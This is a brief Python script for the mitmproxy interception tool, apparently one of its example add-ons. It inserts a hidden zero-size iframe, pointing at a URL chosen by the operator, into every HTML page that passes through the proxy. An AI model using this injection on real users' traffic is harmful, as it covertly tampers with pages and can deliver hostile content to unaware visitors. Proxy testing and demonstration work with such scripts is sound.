# Usage: mitmdump -s "iframe_injector.py url"
# (this script works best with --anticache)
import sys
from bs4 import BeautifulSoup
from mitmproxy.models import decoded
from mitmproxy import ctx

iframe_url = None


def configure(options):
    if len(sys.argv) != 2:
        raise ValueError('Usage: -s "iframe_injector.py url"')
    global iframe_url
    iframe_url = sys.argv[1]


def response():
    if ctx.flow.request.host in iframe_url:
        return
    with decoded(ctx.flow.response):  # Remove content encoding (gzip, ...)
        html = BeautifulSoup(ctx.flow.response.content, "lxml")
        if html.body:
            iframe = html.new_tag(
                "iframe",
                src=iframe_url,
                frameborder=0,
                height=0,
                width=0)
            html.body.insert(0, iframe)
            ctx.flow.response.content = str(html)
            ctx.log.info("Iframe inserted.")
